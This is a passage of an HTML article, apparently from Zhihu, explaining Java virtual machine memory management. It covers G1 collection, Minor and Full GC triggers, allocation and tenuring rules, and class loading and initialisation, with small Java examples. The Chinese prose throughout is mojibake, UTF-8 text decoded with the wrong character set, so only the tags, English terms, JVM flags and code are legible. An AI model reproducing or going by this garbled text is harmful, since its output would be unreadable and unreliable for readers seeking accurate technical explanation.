ä¸­çš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„ GC åœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ã€‚æ­¤é˜¶æ®µå…¶å®ä¹Ÿå¯ä»¥åšåˆ°ä¸ç”¨æˆ·ç¨‹åºä¸€èµ·å¹¶å‘æ‰§è¡Œï¼Œä½†æ˜¯å› ä¸ºåªå›æ”¶ä¸€éƒ¨åˆ† Regionï¼Œæ—¶é—´æ˜¯ç”¨æˆ·å¯æ§åˆ¶çš„ï¼Œè€Œä¸”åœé¡¿ç”¨æˆ·çº¿ç¨‹å°†å¤§å¹…åº¦æé«˜æ”¶é›†æ•ˆç‡ã€‚</li></ul><p>å…·å¤‡å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>ç©ºé—´æ•´åˆï¼šæ•´ä½“æ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®° - æ•´ç†â€ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼Œä»å±€éƒ¨ï¼ˆä¸¤ä¸ª Region ä¹‹é—´ï¼‰ä¸Šæ¥çœ‹æ˜¯åŸºäºâ€œå¤åˆ¶â€ç®—æ³•å®ç°çš„ï¼Œè¿™æ„å‘³ç€è¿è¡ŒæœŸé—´ä¸ä¼šäº§ç”Ÿå†…å­˜ç©ºé—´ç¢ç‰‡ã€‚</li><li>å¯é¢„æµ‹çš„åœé¡¿ï¼šèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸º M æ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨ GC ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡ N æ¯«ç§’ã€‚</li></ul><h2>ä¸‰ã€å†…å­˜åˆ†é…ä¸å›æ”¶ç­–ç•¥</h2><h2>Minor GC å’Œ Full GC</h2><ul><li> Minor GCï¼šå›æ”¶æ–°ç”Ÿä»£ï¼Œå› ä¸ºæ–°ç”Ÿä»£å¯¹è±¡å­˜æ´»æ—¶é—´å¾ˆçŸ­ï¼Œå› æ­¤ Minor GC ä¼šé¢‘ç¹æ‰§è¡Œï¼Œæ‰§è¡Œçš„é€Ÿåº¦ä¸€èˆ¬ä¹Ÿä¼šæ¯”è¾ƒå¿«ã€‚<br/> </li><li> Full GCï¼šå›æ”¶è€å¹´ä»£å’Œæ–°ç”Ÿä»£ï¼Œè€å¹´ä»£å¯¹è±¡å…¶å­˜æ´»æ—¶é—´é•¿ï¼Œå› æ­¤ Full GC å¾ˆå°‘æ‰§è¡Œï¼Œæ‰§è¡Œé€Ÿåº¦ä¼šæ¯” Minor GC æ…¢å¾ˆå¤šã€‚<br/> </li></ul><h2>å†…å­˜åˆ†é…ç­–ç•¥</h2><h3>1. å¯¹è±¡ä¼˜å…ˆåœ¨ Eden åˆ†é…</h3><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯¹è±¡åœ¨æ–°ç”Ÿä»£ Eden ä¸Šåˆ†é…ï¼Œå½“ Eden ç©ºé—´ä¸å¤Ÿæ—¶ï¼Œå‘èµ· Minor GCã€‚</p><h3>2. å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</h3><p>å¤§å¯¹è±¡æ˜¯æŒ‡éœ€è¦è¿ç»­å†…å­˜ç©ºé—´çš„å¯¹è±¡ï¼Œæœ€å…¸å‹çš„å¤§å¯¹è±¡æ˜¯é‚£ç§å¾ˆé•¿çš„å­—ç¬¦ä¸²ä»¥åŠæ•°ç»„ã€‚</p><p>ç»å¸¸å‡ºç°å¤§å¯¹è±¡ä¼šæå‰è§¦å‘åƒåœ¾æ”¶é›†ä»¥è·å–è¶³å¤Ÿçš„è¿ç»­ç©ºé—´åˆ†é…ç»™å¤§å¯¹è±¡ã€‚</p><p>-XX:PretenureSizeThresholdï¼Œå¤§äºæ­¤å€¼çš„å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…ï¼Œé¿å…åœ¨ Eden å’Œ Survivor ä¹‹é—´çš„å¤§é‡å†…å­˜å¤åˆ¶ã€‚</p><h3>3. é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£</h3><p>ä¸ºå¯¹è±¡å®šä¹‰å¹´é¾„è®¡æ•°å™¨ï¼Œå¯¹è±¡åœ¨ Eden å‡ºç”Ÿå¹¶ç»è¿‡ Minor GC ä¾ç„¶å­˜æ´»ï¼Œå°†ç§»åŠ¨åˆ° Survivor ä¸­ï¼Œå¹´é¾„å°±å¢åŠ  1 å²ï¼Œå¢åŠ åˆ°ä¸€å®šå¹´é¾„åˆ™ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ã€‚</p><p>-XX:MaxTenuringThreshold ç”¨æ¥å®šä¹‰å¹´é¾„çš„é˜ˆå€¼ã€‚</p><h3>4. åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®š</h3><p>è™šæ‹Ÿæœºå¹¶ä¸æ˜¯æ°¸è¿œè¦æ±‚å¯¹è±¡çš„å¹´é¾„å¿…é¡»è¾¾åˆ° MaxTenuringThreshold æ‰èƒ½æ™‹å‡è€å¹´ä»£ï¼Œå¦‚æœåœ¨ Survivor ä¸­ç›¸åŒå¹´é¾„æ‰€æœ‰å¯¹è±¡å¤§å°çš„æ€»å’Œå¤§äº Survivor ç©ºé—´çš„ä¸€åŠï¼Œåˆ™å¹´é¾„å¤§äºæˆ–ç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡å¯ä»¥ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œæ— éœ€ç­‰åˆ° MaxTenuringThreshold ä¸­è¦æ±‚çš„å¹´é¾„ã€‚</p><h3>5. ç©ºé—´åˆ†é…æ‹…ä¿</h3><p>åœ¨å‘ç”Ÿ Minor GC ä¹‹å‰ï¼Œè™šæ‹Ÿæœºå…ˆæ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºæ–°ç”Ÿä»£æ‰€æœ‰å¯¹è±¡æ€»ç©ºé—´ï¼Œå¦‚æœæ¡ä»¶æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆ Minor GC å¯ä»¥ç¡®è®¤æ˜¯å®‰å…¨çš„ã€‚</p><p>å¦‚æœä¸æˆç«‹çš„è¯è™šæ‹Ÿæœºä¼šæŸ¥çœ‹ HandlePromotionFailure çš„å€¼æ˜¯å¦å…è®¸æ‹…ä¿å¤±è´¥ï¼Œå¦‚æœå…è®¸é‚£ä¹ˆå°±ä¼šç»§ç»­æ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºå†æ¬¡æ™‹å‡åˆ°è€å¹´ä»£å¯¹è±¡çš„å¹³å‡å¤§å°ï¼Œå¦‚æœå¤§äºï¼Œå°†å°è¯•ç€è¿›è¡Œä¸€æ¬¡ Minor GCï¼›å¦‚æœå°äºï¼Œæˆ–è€… HandlePromotionFailure çš„å€¼ä¸å…è®¸å†’é™©ï¼Œé‚£ä¹ˆå°±è¦è¿›è¡Œä¸€æ¬¡ Full GCã€‚</p><h2>Full GC çš„è§¦å‘æ¡ä»¶</h2><p>å¯¹äº Minor GCï¼Œå…¶è§¦å‘æ¡ä»¶éå¸¸ç®€å•ï¼Œå½“ Eden ç©ºé—´æ»¡æ—¶ï¼Œå°±å°†è§¦å‘ä¸€æ¬¡ Minor GCã€‚è€Œ Full GC åˆ™ç›¸å¯¹å¤æ‚ï¼Œæœ‰ä»¥ä¸‹æ¡ä»¶ï¼š</p><h3>1. è°ƒç”¨ System.gc()</h3><p>åªæ˜¯å»ºè®®è™šæ‹Ÿæœºæ‰§è¡Œ Full GCï¼Œä½†æ˜¯è™šæ‹Ÿæœºä¸ä¸€å®šçœŸæ­£å»æ‰§è¡Œã€‚ä¸å»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè€Œæ˜¯è®©è™šæ‹Ÿæœºç®¡ç†å†…å­˜ã€‚</p><h3>2. è€å¹´ä»£ç©ºé—´ä¸è¶³</h3><p>è€å¹´ä»£ç©ºé—´ä¸è¶³çš„å¸¸è§åœºæ™¯ä¸ºå‰æ–‡æ‰€è®²çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ã€é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ç­‰ã€‚</p><p>ä¸ºäº†é¿å…ä»¥ä¸ŠåŸå› å¼•èµ·çš„ Full GCï¼Œåº”å½“å°½é‡ä¸è¦åˆ›å»ºè¿‡å¤§çš„å¯¹è±¡ä»¥åŠæ•°ç»„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¯ä»¥é€šè¿‡ -Xmn è™šæ‹Ÿæœºå‚æ•°è°ƒå¤§æ–°ç”Ÿä»£çš„å¤§å°ï¼Œè®©å¯¹è±¡å°½é‡åœ¨æ–°ç”Ÿä»£è¢«å›æ”¶æ‰ï¼Œä¸è¿›å…¥è€å¹´ä»£ã€‚è¿˜å¯ä»¥é€šè¿‡ -XX:MaxTenuringThreshold è°ƒå¤§å¯¹è±¡è¿›å…¥è€å¹´ä»£çš„å¹´é¾„ï¼Œè®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»ä¸€æ®µæ—¶é—´ã€‚</p><h3>3. ç©ºé—´åˆ†é…æ‹…ä¿å¤±è´¥</h3><p>ä½¿ç”¨å¤åˆ¶ç®—æ³•çš„ Minor GC éœ€è¦è€å¹´ä»£çš„å†…å­˜ç©ºé—´ä½œæ‹…ä¿ï¼Œå¦‚æœæ‹…ä¿å¤±è´¥ä¼šæ‰§è¡Œä¸€æ¬¡ Full GCã€‚å…·ä½“å†…å®¹è¯·å‚è€ƒä¸Šé¢çš„ç¬¬ 5 å°èŠ‚ã€‚</p><h3>4. JDK 1.7 åŠä»¥å‰çš„æ°¸ä¹…ä»£ç©ºé—´ä¸è¶³</h3><p>åœ¨ JDK 1.7 åŠä»¥å‰ï¼ŒHotSpot è™šæ‹Ÿæœºä¸­çš„æ–¹æ³•åŒºæ˜¯ç”¨æ°¸ä¹…ä»£å®ç°çš„ï¼Œæ°¸ä¹…ä»£ä¸­å­˜æ”¾çš„ä¸ºä¸€äº› Class çš„ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰æ•°æ®ã€‚</p><p>å½“ç³»ç»Ÿä¸­è¦åŠ è½½çš„ç±»ã€åå°„çš„ç±»å’Œè°ƒç”¨çš„æ–¹æ³•è¾ƒå¤šæ—¶ï¼Œæ°¸ä¹…ä»£å¯èƒ½ä¼šè¢«å æ»¡ï¼Œåœ¨æœªé…ç½®ä¸ºé‡‡ç”¨ CMS GC çš„æƒ…å†µä¸‹ä¹Ÿä¼šæ‰§è¡Œ Full GCã€‚å¦‚æœç»è¿‡ Full GC ä»ç„¶å›æ”¶ä¸äº†ï¼Œé‚£ä¹ˆè™šæ‹Ÿæœºä¼šæŠ›å‡º java.lang.OutOfMemoryErrorã€‚</p><p>ä¸ºé¿å…ä»¥ä¸ŠåŸå› å¼•èµ·çš„ Full GCï¼Œå¯é‡‡ç”¨çš„æ–¹æ³•ä¸ºå¢å¤§æ°¸ä¹…ä»£ç©ºé—´æˆ–è½¬ä¸ºä½¿ç”¨ CMS GCã€‚</p><h3>5. Concurrent Mode Failure</h3><p>æ‰§è¡Œ CMS GC çš„è¿‡ç¨‹ä¸­åŒæ—¶æœ‰å¯¹è±¡è¦æ”¾å…¥è€å¹´ä»£ï¼Œè€Œæ­¤æ—¶è€å¹´ä»£ç©ºé—´ä¸è¶³ï¼ˆå¯èƒ½æ˜¯ GC è¿‡ç¨‹ä¸­æµ®åŠ¨åƒåœ¾è¿‡å¤šå¯¼è‡´æš‚æ—¶æ€§çš„ç©ºé—´ä¸è¶³ï¼‰ï¼Œä¾¿ä¼šæŠ¥ Concurrent Mode Failure é”™è¯¯ï¼Œå¹¶è§¦å‘ Full GCã€‚</p><h2>å››ã€ç±»åŠ è½½æœºåˆ¶</h2><p>ç±»æ˜¯åœ¨è¿è¡ŒæœŸé—´ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶åŠ¨æ€åŠ è½½çš„ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰ç±»ã€‚å› ä¸ºå¦‚æœä¸€æ¬¡æ€§åŠ è½½ï¼Œé‚£ä¹ˆä¼šå ç”¨å¾ˆå¤šçš„å†…å­˜ã€‚</p><h2>ç±»çš„ç”Ÿå‘½å‘¨æœŸ</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-ec3637dda2f4cfe987b4e2f1a9a81a27_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1085\" data-rawheight=\"257\" class=\"origin_image zh-lightbox-thumb\" width=\"1085\" data-original=\"https://pic4.zhimg.com/v2-ec3637dda2f4cfe987b4e2f1a9a81a27_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1085&#39; height=&#39;257&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1085\" data-rawheight=\"257\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1085\" data-original=\"https://pic4.zhimg.com/v2-ec3637dda2f4cfe987b4e2f1a9a81a27_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-ec3637dda2f4cfe987b4e2f1a9a81a27_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>åŒ…æ‹¬ä»¥ä¸‹ 7 ä¸ªé˜¶æ®µï¼š</p><ul><li><b>åŠ è½½ï¼ˆLoadingï¼‰</b> </li><li><b>éªŒè¯ï¼ˆVerificationï¼‰</b> </li><li><b>å‡†å¤‡ï¼ˆPreparationï¼‰</b> </li><li><b>è§£æï¼ˆResolutionï¼‰</b> </li><li><b>åˆå§‹åŒ–ï¼ˆInitializationï¼‰</b> </li><li>ä½¿ç”¨ï¼ˆUsingï¼‰</li><li>å¸è½½ï¼ˆUnloadingï¼‰</li></ul><h2>ç±»åŠ è½½è¿‡ç¨‹</h2><p>åŒ…å«äº†åŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æå’Œåˆå§‹åŒ–è¿™ 5 ä¸ªé˜¶æ®µã€‚</p><h3>1. åŠ è½½</h3><p>åŠ è½½æ˜¯ç±»åŠ è½½çš„ä¸€ä¸ªé˜¶æ®µï¼Œæ³¨æ„ä¸è¦æ··æ·†ã€‚</p><p>åŠ è½½è¿‡ç¨‹å®Œæˆä»¥ä¸‹ä¸‰ä»¶äº‹ï¼š</p><ul><li>é€šè¿‡ç±»çš„å®Œå…¨é™å®šåç§°è·å–å®šä¹‰è¯¥ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚</li><li>å°†è¯¥å­—èŠ‚æµè¡¨ç¤ºçš„é™æ€å­˜å‚¨ç»“æ„è½¬æ¢ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶å­˜å‚¨ç»“æ„ã€‚</li><li>åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„ Class å¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºä¸­è¯¥ç±»å„ç§æ•°æ®çš„è®¿é—®å…¥å£ã€‚</li></ul><p>å…¶ä¸­äºŒè¿›åˆ¶å­—èŠ‚æµå¯ä»¥ä»ä»¥ä¸‹æ–¹å¼ä¸­è·å–ï¼š</p><ul><li>ä» ZIP åŒ…è¯»å–ï¼Œæˆä¸º JARã€EARã€WAR æ ¼å¼çš„åŸºç¡€ã€‚</li><li>ä»ç½‘ç»œä¸­è·å–ï¼Œæœ€å…¸å‹çš„åº”ç”¨æ˜¯ Appletã€‚</li><li>è¿è¡Œæ—¶è®¡ç®—ç”Ÿæˆï¼Œä¾‹å¦‚åŠ¨æ€ä»£ç†æŠ€æœ¯ï¼Œåœ¨ java.lang.reflect.Proxy ä½¿ç”¨ ProxyGenerator.generateProxyClass çš„ä»£ç†ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚</li><li>ç”±å…¶ä»–æ–‡ä»¶ç”Ÿæˆï¼Œä¾‹å¦‚ç”± JSP æ–‡ä»¶ç”Ÿæˆå¯¹åº”çš„ Class ç±»ã€‚</li></ul><h3>2. éªŒè¯</h3><p>ç¡®ä¿ Class æ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚</p><h3>3. å‡†å¤‡</h3><p>ç±»å˜é‡æ˜¯è¢« static ä¿®é¥°çš„å˜é‡ï¼Œå‡†å¤‡é˜¶æ®µä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®åˆå§‹å€¼ï¼Œä½¿ç”¨çš„æ˜¯æ–¹æ³•åŒºçš„å†…å­˜ã€‚</p><p>å®ä¾‹å˜é‡ä¸ä¼šåœ¨è¿™é˜¶æ®µåˆ†é…å†…å­˜ï¼Œå®ƒä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·è¢«åˆ†é…åœ¨å †ä¸­ã€‚åº”è¯¥æ³¨æ„åˆ°ï¼Œå®ä¾‹åŒ–ä¸æ˜¯ç±»åŠ è½½çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç±»åŠ è½½å‘ç”Ÿåœ¨æ‰€æœ‰å®ä¾‹åŒ–æ“ä½œä¹‹å‰ï¼Œå¹¶ä¸”ç±»åŠ è½½åªè¿›è¡Œä¸€æ¬¡ï¼Œå®ä¾‹åŒ–å¯ä»¥è¿›è¡Œå¤šæ¬¡ã€‚</p><p>åˆå§‹å€¼ä¸€èˆ¬ä¸º 0 å€¼ï¼Œä¾‹å¦‚ä¸‹é¢çš„ç±»å˜é‡ value è¢«åˆå§‹åŒ–ä¸º 0 è€Œä¸æ˜¯ 123ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span></code></pre></div><p>å¦‚æœç±»å˜é‡æ˜¯å¸¸é‡ï¼Œé‚£ä¹ˆå®ƒå°†åˆå§‹åŒ–ä¸ºè¡¨è¾¾å¼æ‰€å®šä¹‰çš„å€¼è€Œä¸æ˜¯ 0ã€‚ä¾‹å¦‚ä¸‹é¢çš„å¸¸é‡ value è¢«åˆå§‹åŒ–ä¸º 123 è€Œä¸æ˜¯ 0ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span></code></pre></div><h3>4. è§£æ</h3><p>å°†å¸¸é‡æ± çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ã€‚</p><p>å…¶ä¸­è§£æè¿‡ç¨‹åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥åœ¨åˆå§‹åŒ–é˜¶æ®µä¹‹åå†å¼€å§‹ï¼Œè¿™æ˜¯ä¸ºäº†æ”¯æŒ Java çš„åŠ¨æ€ç»‘å®šã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><h3>5. åˆå§‹åŒ–</h3><p class=\"ztext-empty-paragraph\"><br/></p><p>åˆå§‹åŒ–é˜¶æ®µæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œç±»ä¸­å®šä¹‰çš„ Java ç¨‹åºä»£ç ã€‚åˆå§‹åŒ–é˜¶æ®µæ˜¯è™šæ‹Ÿæœºæ‰§è¡Œç±»æ„é€ å™¨ &lt;clinit&gt;() æ–¹æ³•çš„è¿‡ç¨‹ã€‚åœ¨å‡†å¤‡é˜¶æ®µï¼Œç±»å˜é‡å·²ç»èµ‹è¿‡ä¸€æ¬¡ç³»ç»Ÿè¦æ±‚çš„åˆå§‹å€¼ï¼Œè€Œåœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œæ ¹æ®ç¨‹åºå‘˜é€šè¿‡ç¨‹åºåˆ¶å®šçš„ä¸»è§‚è®¡åˆ’å»åˆå§‹åŒ–ç±»å˜é‡å’Œå…¶å®ƒèµ„æºã€‚</p><p>&lt;clinit&gt;() æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ”¶é›†ç±»ä¸­æ‰€æœ‰ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€è¯­å¥å—ä¸­çš„è¯­å¥åˆå¹¶äº§ç”Ÿçš„ï¼Œç¼–è¯‘å™¨æ”¶é›†çš„é¡ºåºç”±è¯­å¥åœ¨æºæ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºå†³å®šã€‚ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œé™æ€è¯­å¥å—åªèƒ½è®¿é—®åˆ°å®šä¹‰åœ¨å®ƒä¹‹å‰çš„ç±»å˜é‡ï¼Œå®šä¹‰åœ¨å®ƒä¹‹åçš„ç±»å˜é‡åªèƒ½èµ‹å€¼ï¼Œä¸èƒ½è®¿é—®ã€‚ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Test</span> <span class=\"o\">{</span>\n    <span class=\"kd\">static</span> <span class=\"o\">{</span>\n        <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>                <span class=\"c1\">// ç»™å˜é‡èµ‹å€¼å¯ä»¥æ­£å¸¸ç¼–è¯‘é€šè¿‡\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>  <span class=\"c1\">// è¿™å¥ç¼–è¯‘å™¨ä¼šæç¤ºâ€œéæ³•å‘å‰å¼•ç”¨â€\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n    <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ç”±äºçˆ¶ç±»çš„ &lt;clinit&gt;() æ–¹æ³•å…ˆæ‰§è¡Œï¼Œä¹Ÿå°±æ„å‘³ç€çˆ¶ç±»ä¸­å®šä¹‰çš„é™æ€è¯­å¥å—çš„æ‰§è¡Œè¦ä¼˜å…ˆäºå­ç±»ã€‚ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Parent</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">A</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"kd\">static</span> <span class=\"o\">{</span>\n        <span class=\"n\">A</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Sub</span> <span class=\"kd\">extends</span> <span class=\"n\">Parent</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">B</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n     <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">Sub</span><span class=\"o\">.</span><span class=\"na\">B</span><span class=\"o\">);</span>  <span class=\"c1\">// 2\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p>æ¥å£ä¸­ä¸å¯ä»¥ä½¿ç”¨é™æ€è¯­å¥å—ï¼Œä½†ä»ç„¶æœ‰ç±»å˜é‡åˆå§‹åŒ–çš„èµ‹å€¼æ“ä½œï¼Œå› æ­¤æ¥å£ä¸ç±»ä¸€æ ·éƒ½ä¼šç”Ÿæˆ &lt;clinit&gt;() æ–¹æ³•ã€‚ä½†æ¥å£ä¸ç±»ä¸åŒçš„æ˜¯ï¼Œæ‰§è¡Œæ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ä¸éœ€è¦å…ˆæ‰§è¡Œçˆ¶æ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ã€‚åªæœ‰å½“çˆ¶æ¥å£ä¸­å®šä¹‰çš„å˜é‡ä½¿ç”¨æ—¶ï¼Œçˆ¶æ¥å£æ‰ä¼šåˆå§‹åŒ–ã€‚å¦å¤–ï¼Œæ¥å£çš„å®ç°ç±»åœ¨åˆå§‹åŒ–æ—¶ä¹Ÿä¸€æ ·ä¸ä¼šæ‰§è¡Œæ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ã€‚</p><p>è™šæ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è¢«æ­£ç¡®çš„åŠ é”å’ŒåŒæ­¥ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œåªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¿™ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•ï¼Œå…¶å®ƒçº¿ç¨‹éƒ½ä¼šé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æ´»åŠ¨çº¿ç¨‹æ‰§è¡Œ &lt;clinit&gt;() æ–¹æ³•å®Œæ¯•ã€‚å¦‚æœåœ¨ä¸€ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•ä¸­æœ‰è€—æ—¶çš„æ“ä½œï¼Œå°±å¯èƒ½é€ æˆå¤šä¸ªçº¿ç¨‹é˜»å¡ï¼Œåœ¨å®é™…è¿‡ç¨‹ä¸­æ­¤ç§é˜»å¡å¾ˆéšè”½ã€‚</p><h2>ç±»åˆå§‹åŒ–æ—¶æœº</h2><h3>1. ä¸»åŠ¨å¼•ç”¨</h3><p>è™šæ‹Ÿæœºè§„èŒƒä¸­å¹¶æ²¡æœ‰å¼ºåˆ¶çº¦æŸä½•æ—¶è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯è§„èŒƒä¸¥æ ¼è§„å®šäº†æœ‰ä¸”åªæœ‰ä¸‹åˆ—äº”ç§æƒ…å†µå¿…é¡»å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼ˆåŠ è½½ã€éªŒè¯ã€å‡†å¤‡éƒ½ä¼šéšä¹‹å‘ç”Ÿï¼‰ï¼š</p><ul><li> é‡åˆ° newã€getstaticã€putstaticã€invokestatic è¿™å››æ¡å­—èŠ‚ç æŒ‡ä»¤æ—¶ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™å¿…é¡»å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚æœ€å¸¸è§çš„ç”Ÿæˆè¿™ 4 æ¡æŒ‡ä»¤çš„åœºæ™¯æ˜¯ï¼šä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼›è¯»å–æˆ–è®¾ç½®ä¸€ä¸ªç±»çš„é™æ€å­—æ®µï¼ˆè¢« final ä¿®é¥°ã€å·²åœ¨ç¼–è¯‘æœŸæŠŠç»“æœæ”¾å…¥å¸¸é‡æ± çš„é™æ€å­—æ®µé™¤å¤–ï¼‰çš„æ—¶å€™ï¼›ä»¥åŠè°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•çš„æ—¶å€™ã€‚<br/> </li><li> ä½¿ç”¨ java.lang.reflect åŒ…çš„æ–¹æ³•å¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚<br/> </li><li> 